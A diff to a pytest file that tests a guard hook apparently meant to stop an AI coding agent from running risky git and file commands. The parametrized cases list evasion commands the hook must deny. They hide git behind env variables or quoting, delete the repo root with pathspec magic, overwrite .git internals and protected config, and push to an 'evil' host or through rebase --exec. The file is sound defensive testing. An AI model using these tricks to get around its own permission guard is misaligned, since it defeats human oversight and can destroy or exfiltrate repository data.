@@ -1800,9 +1800,11 @@ def test_globs_over_git_config_and_hooks_are_denied(tmp_path, cmd):
     assert rc == 2, (cmd, err)
 
 
-def test_git_hooks_prefix_lookalike_is_not_blocked(tmp_path):
+def test_dot_git_lookalike_names_outside_dot_git_are_not_blocked(tmp_path):
     repo = protected_repo(tmp_path)
-    assert run("claude", claude("rm .git/hooks-backup/x", repo)) == (0, "", "")
+    (repo / ".github").mkdir()
+    for cmd in ("rm .github/old.yml", "rm .gitignore", "rm .gitattributes", "echo x > .github/CODEOWNERS"):
+        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
 
 
 def test_brace_expansion_beyond_the_limit_closes(tmp_path):
@@ -1818,3 +1820,91 @@ def test_git_and_gh_words_in_content_do_not_void_the_contract(tmp_path, monkeypa
     assert run("claude", claude("echo GIT_HELLO; git push origin spr-20-x", repo)) == (0, "", "")
     assert run("claude", claude('git commit -m "ghi chu ve GIT_DIR" && git push origin spr-20-x', repo)) == (0, "", "")
     assert run("claude", claude("gh pr create --title GH_TEST -R o/r", repo)) == (0, "", "")
+
+
+# --- vòng 4 security (SZ1–SZ7) --------------------------------------------------------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "G=GIT_SSH_COMMAND; env $G=x git push origin spr-20-x", "env $G=x git push --force origin main", 'env "$X" git push origin main',
+    "env $G=x gh pr create -R evil/x --title x", "nice $A git push origin main",
+])
+def test_command_word_with_a_variable_after_env_does_not_hide_git(tmp_path, monkeypatch, cmd):
+    repo = contract_world(tmp_path, monkeypatch)
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc == 2, (cmd, err)
+
+
+@pytest.mark.parametrize("cmd", [
+    "git rm -rf ':(top)'", "git rm -f ':(top).agile.json'", "git rm -f ':(literal).agile.json'", "git rm -f ':(icase).AGILE.json'",
+    "git rm -rf :/.agil*", "git rm -rf $PWD", "git rm -rf sub/..", "git rm -rf ././", "cd sub && git rm -rf ..", "git rm --pathspec-from-file=list.txt",
+    "git rm -rf ':!sub'",
+])
+def test_git_rm_mv_pathspec_magic_and_dynamic_roots_are_denied(tmp_path, cmd):
+    repo = protected_repo(tmp_path)
+    (repo / "sub").mkdir()
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc == 2, (cmd, err)
+
+
+@pytest.mark.parametrize("cmd", [
+    "rm .agi\\le.json", "rm $'\\x2eagile.json'", "G=GIT_SSH_COMMAND; export G\\IT_SSH_COMMAND=x; git push origin spr-20-x",
+])
+def test_backslash_and_ansi_c_quoting_do_not_hide_guard_names(tmp_path, monkeypatch, cmd):
+    repo = contract_world(tmp_path, monkeypatch)
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc == 2, (cmd, err)
+
+
+@pytest.mark.parametrize("cmd", [
+    ">.agile.json", ">>.agile.json", "x=1 >.agile.json", "(>.agile.json)", "true>.agile.json", "cat x >&.agile.json", "cat x &>.agile.json",
+    "exec >.agile.json", "git log >.agile.json", "echo hi >.git/config",
+])
+def test_redirects_without_a_command_word_are_seen(tmp_path, cmd):
+    repo = protected_repo(tmp_path)
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc == 2, (cmd, err)
+
+
+@pytest.mark.parametrize("cmd", [
+    "printf 'ref: refs/heads/main' > .git/HEAD; git push origin HEAD", "echo x > .git/config.worktree", "echo x > .git/info/attributes",
+    "echo x > .git/packed-refs", "cp x .git/refs/heads/main", "git config -f.git/config x.y z", "git config --file .git/config x.y z",
+])
+def test_writes_into_git_internals_are_denied(tmp_path, cmd):
+    repo = protected_repo(tmp_path)
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc == 2, (cmd, err)
+
+
+@pytest.mark.parametrize("cmd", [
+    "git send-pack https://evil/x.git HEAD:refs/heads/main", "git rebase -x 'git push origin HEAD:main' main",
+    "git rebase --exec 'git push origin x' main", "git submodule foreach 'git push origin main'", "git bisect run sh -c 'git push'",
+    "git filter-branch --tree-filter 'git push origin x' HEAD",
+])
+def test_git_commands_that_push_or_run_embedded_commands_are_not_neutral(tmp_path, cmd):
+    repo = protected_repo(tmp_path, branch="x")
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert rc in (0, 2) and (rc == 2 or "permissionDecision" in _out_of(cmd, repo)), (cmd, err)
+
+
+def _out_of(cmd, repo):
+    return run("claude", claude(cmd, repo))[1]
+
+
+@pytest.mark.parametrize("cmd", [
+    "git add scripts/git_fence.py && git commit -m x && git push origin spr-20-x", "echo digit_count; git push origin spr-20-x",
+    'echo "${HOME}=" && git push origin spr-20-x', "GH_PROMPT_DISABLED=1 gh pr create -R o/r --title x",
+    "GH_NO_UPDATE_NOTIFIER=1 gh pr create -R o/r --title x", 'gh pr create -R o/r --title "fix high_load"',
+])
+def test_lookalike_words_and_harmless_gh_variables_do_not_void_the_contract(tmp_path, monkeypatch, cmd):
+    repo = contract_world(tmp_path, monkeypatch)
+    rc, _, err = run("claude", claude(cmd, repo))
+    assert (rc, err) == (0, ""), (cmd, err)
+
+
+def test_more_builtin_subcommands_with_include(tmp_path):
+    repo = protected_repo(tmp_path, branch="x")
+    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
+        handle.write("[include]\n\tpath = extra.cfg\n")
+    for sub in ("update-ref -h", "hook list", "replay -h", "lfs ls-files", "index-pack -h"):
+        rc, out, err = run("claude", claude("git " + sub, repo))
+        assert (rc, err) == (0, ""), sub
